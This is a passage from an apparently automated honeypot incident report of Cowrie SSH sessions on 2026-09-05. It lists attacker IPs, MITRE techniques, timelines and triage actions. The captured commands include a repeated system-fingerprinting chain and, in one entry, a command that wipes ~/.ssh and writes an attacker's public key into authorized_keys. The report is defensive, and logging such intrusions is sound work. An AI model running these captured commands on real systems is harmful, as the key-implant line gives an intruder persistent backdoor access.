| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:24:44` | `cowrie.session.connect` |
| `2026-09-05 07:24:45` | `cowrie.client.version` |
| `2026-09-05 07:24:45` | `cowrie.client.kex` |
| `2026-09-05 07:24:46` | `cowrie.login.success` |
| `2026-09-05 07:24:48` | `cowrie.session.params` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.success` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.command.input` |
| `2026-09-05 07:24:48` | `cowrie.log.closed` |
| `2026-09-05 07:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5861f0e5abd2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:26 |
| **Last Seen** | 2026-09-05 07:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:26:58` | `cowrie.session.connect` |
| `2026-09-05 07:26:58` | `cowrie.client.version` |
| `2026-09-05 07:26:58` | `cowrie.client.kex` |
| `2026-09-05 07:27:00` | `cowrie.login.success` |
| `2026-09-05 07:27:01` | `cowrie.session.params` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.success` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.command.input` |
| `2026-09-05 07:27:01` | `cowrie.log.closed` |
| `2026-09-05 07:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-289616937e94

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 07:28 |
| **Last Seen** | 2026-09-05 07:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:28:28` | `cowrie.session.connect` |
| `2026-09-05 07:28:28` | `cowrie.client.version` |
| `2026-09-05 07:28:28` | `cowrie.client.kex` |
| `2026-09-05 07:28:28` | `cowrie.login.success` |
| `2026-09-05 07:28:29` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:28:30` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 07:28:30` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:28:30` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:28:30` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 07:28:30` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:28:31` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:28:32` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 07:28:32` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f3fcbcc3594

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:29 |
| **Last Seen** | 2026-09-05 07:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:29:13` | `cowrie.session.connect` |
| `2026-09-05 07:29:13` | `cowrie.client.version` |
| `2026-09-05 07:29:13` | `cowrie.client.kex` |
| `2026-09-05 07:29:15` | `cowrie.login.success` |
| `2026-09-05 07:29:17` | `cowrie.session.params` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.success` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.command.input` |
| `2026-09-05 07:29:17` | `cowrie.log.closed` |
| `2026-09-05 07:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae17b9292bb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 07:30 |
| **Last Seen** | 2026-09-05 07:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:30:53` | `cowrie.session.connect` |
| `2026-09-05 07:30:53` | `cowrie.client.version` |
| `2026-09-05 07:30:54` | `cowrie.client.kex` |
| `2026-09-05 07:30:54` | `cowrie.login.success` |
| `2026-09-05 07:30:55` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:30:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 07:30:55` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e910025d9a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:31 |
| **Last Seen** | 2026-09-05 07:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:31:29` | `cowrie.session.connect` |
| `2026-09-05 07:31:30` | `cowrie.client.version` |
| `2026-09-05 07:31:30` | `cowrie.client.kex` |
| `2026-09-05 07:31:32` | `cowrie.login.success` |
| `2026-09-05 07:31:33` | `cowrie.session.params` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.success` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.command.input` |
| `2026-09-05 07:31:33` | `cowrie.log.closed` |
| `2026-09-05 07:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c8a7c735b8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:33 |
| **Last Seen** | 2026-09-05 07:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:33:46` | `cowrie.session.connect` |
| `2026-09-05 07:33:46` | `cowrie.client.version` |
| `2026-09-05 07:33:46` | `cowrie.client.kex` |
| `2026-09-05 07:33:48` | `cowrie.login.success` |
| `2026-09-05 07:33:50` | `cowrie.session.params` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.success` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.command.input` |
| `2026-09-05 07:33:50` | `cowrie.log.closed` |
| `2026-09-05 07:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fb98af5a3c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:38 |
| **Last Seen** | 2026-09-05 07:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:38:21` | `cowrie.session.connect` |
| `2026-09-05 07:38:21` | `cowrie.client.version` |
| `2026-09-05 07:38:21` | `cowrie.client.kex` |
| `2026-09-05 07:38:23` | `cowrie.login.success` |
| `2026-09-05 07:38:24` | `cowrie.session.params` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.success` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:24` | `cowrie.command.input` |
| `2026-09-05 07:38:25` | `cowrie.log.closed` |
| `2026-09-05 07:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3705ccb6291

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:40 |
| **Last Seen** | 2026-09-05 07:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:40:34` | `cowrie.session.connect` |
| `2026-09-05 07:40:34` | `cowrie.client.version` |
| `2026-09-05 07:40:34` | `cowrie.client.kex` |
| `2026-09-05 07:40:35` | `cowrie.login.success` |
| `2026-09-05 07:40:37` | `cowrie.session.params` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.success` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.command.input` |
| `2026-09-05 07:40:37` | `cowrie.log.closed` |
| `2026-09-05 07:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5328c21ade7b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 07:41 |
| **Last Seen** | 2026-09-05 07:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:41:55` | `cowrie.session.connect` |
| `2026-09-05 07:41:55` | `cowrie.client.version` |
| `2026-09-05 07:41:55` | `cowrie.client.kex` |
| `2026-09-05 07:41:56` | `cowrie.login.success` |
| `2026-09-05 07:41:56` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:41:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 07:41:56` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a599cdc2be7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 07:42 |
| **Last Seen** | 2026-09-05 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:42:01` | `cowrie.session.connect` |
| `2026-09-05 07:42:01` | `cowrie.client.version` |
| `2026-09-05 07:42:01` | `cowrie.client.kex` |
| `2026-09-05 07:42:02` | `cowrie.login.success` |
| `2026-09-05 07:42:02` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:42:02` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28cddb9c53a0

| Field | Detail |
|---|---|
| **Source IP** | `46.225.62[.]66` |
| **First Seen** | 2026-09-05 07:42 |
| **Last Seen** | 2026-09-05 07:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:42:46` | `cowrie.session.connect` |
| `2026-09-05 07:42:46` | `cowrie.client.version` |
| `2026-09-05 07:42:47` | `cowrie.client.kex` |
| `2026-09-05 07:42:47` | `cowrie.login.success` |
| `2026-09-05 07:42:48` | `cowrie.session.params` |
| `2026-09-05 07:42:48` | `cowrie.command.input` |
| `2026-09-05 07:42:48` | `cowrie.command.failed` |
| `2026-09-05 07:42:48` | `cowrie.log.closed` |
| `2026-09-05 07:42:49` | `cowrie.session.params` |
| `2026-09-05 07:42:49` | `cowrie.command.input` |
| `2026-09-05 07:42:49` | `cowrie.session.file_download` |
| `2026-09-05 07:42:49` | `cowrie.log.closed` |
| `2026-09-05 07:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.225.62[.]66` to AbuseIPDB if not already reported
- [ ] Block `46.225.62[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00acc7db72cb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:42 |
| **Last Seen** | 2026-09-05 07:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:42:48` | `cowrie.session.connect` |
| `2026-09-05 07:42:48` | `cowrie.client.version` |
| `2026-09-05 07:42:48` | `cowrie.client.kex` |
| `2026-09-05 07:42:49` | `cowrie.login.success` |
| `2026-09-05 07:42:50` | `cowrie.session.params` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.success` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:50` | `cowrie.command.input` |
| `2026-09-05 07:42:51` | `cowrie.log.closed` |
| `2026-09-05 07:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf50dfa061be

| Field | Detail |
|---|---|
| **Source IP** | `46.225.62[.]66` |
| **First Seen** | 2026-09-05 07:42 |
| **Last Seen** | 2026-09-05 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:42:49` | `cowrie.session.connect` |
| `2026-09-05 07:42:49` | `cowrie.client.version` |
| `2026-09-05 07:42:49` | `cowrie.client.kex` |
| `2026-09-05 07:42:50` | `cowrie.login.success` |
| `2026-09-05 07:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.225.62[.]66` to AbuseIPDB if not already reported
- [ ] Block `46.225.62[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d3fbe9030b

| Field | Detail |
|---|---|
| **Source IP** | `46.225.62[.]66` |
| **First Seen** | 2026-09-05 07:42 |
| **Last Seen** | 2026-09-05 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:42:50` | `cowrie.session.connect` |
| `2026-09-05 07:42:50` | `cowrie.client.version` |
| `2026-09-05 07:42:50` | `cowrie.client.kex` |
| `2026-09-05 07:42:51` | `cowrie.login.success` |
| `2026-09-05 07:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.225.62[.]66` to AbuseIPDB if not already reported
- [ ] Block `46.225.62[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14474f58e00c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:45 |
| **Last Seen** | 2026-09-05 07:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
